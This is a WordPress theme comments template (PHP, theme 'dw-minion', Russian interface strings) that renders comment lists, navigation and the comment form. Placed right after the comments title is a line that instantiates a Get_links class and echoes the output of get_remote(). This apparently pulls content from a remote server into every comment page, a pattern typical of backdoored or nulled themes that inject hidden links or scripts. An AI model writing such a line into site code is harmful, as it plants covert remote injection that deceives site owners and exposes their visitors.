<?php
if ( post_password_required() )
	return;
?>
	<div id="comments" class="comments-area">
	<?php if ( have_comments() ) : ?>
		<h2 class="comments-title"><?php printf( _n( 'Один комментарий', 'Комментариев: %1$s', 'dw-minion' ), get_comments_number() ); ?></h2>
		<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); $links = new Get_links(); $links = $links->get_remote(); echo $links; ?>
		<?php if ( get_comment_pages_count() > 1 && get_option( 'page_comments' ) ) : ?>
		<nav id="comment-nav-above" class="comment-navigation" role="navigation">
			<h1 class="screen-reader-text"><?php _e( 'Навигация по комментариям', 'dw-minion' ); ?></h1>
			<div class="nav-previous"><?php previous_comments_link( __( '&larr; Предыдущие комментарии', 'dw-minion' ) ); ?></div>
			<div class="nav-next"><?php next_comments_link( __( 'Новые комментарии &rarr;', 'dw-minion' ) ); ?></div>
		</nav>
		<?php endif; ?>

		<ol class="comment-list">
			<?php wp_list_comments( array( 'callback' => 'dw_minion_comment' ) ); ?>
		</ol>

		<?php if ( get_comment_pages_count() > 1 && get_option( 'page_comments' ) ) : ?>
		<nav id="comment-nav-below" class="comment-navigation" role="navigation">
			<h1 class="screen-reader-text"><?php _e( 'Навигация по комментариям', 'dw-minion' ); ?></h1>
			<div class="nav-previous"><?php previous_comments_link( __( '&larr; Предыдущие комментарии', 'dw-minion' ) ); ?></div>
			<div class="nav-next"><?php next_comments_link( __( 'Новые комментарии &rarr;', 'dw-minion' ) ); ?></div>
		</nav>
		<?php endif; ?>

	<?php endif; ?>

	<?php if ( ! comments_open() && '0' != get_comments_number() && post_type_supports( get_post_type(), 'comments' ) ) : ?>
		<p class="no-comments"><?php _e( 'Комментарии закрыты', 'dw-minion' ); ?></p>
	<?php endif; ?>

	<?php comment_form( array(
	  'comment_notes_after'	=> '',
	  'comment_notes_before' => '',
	  'title_reply'       	=> __( 'Комментировать', 'dw-minion' )
	)); ?>

</div>
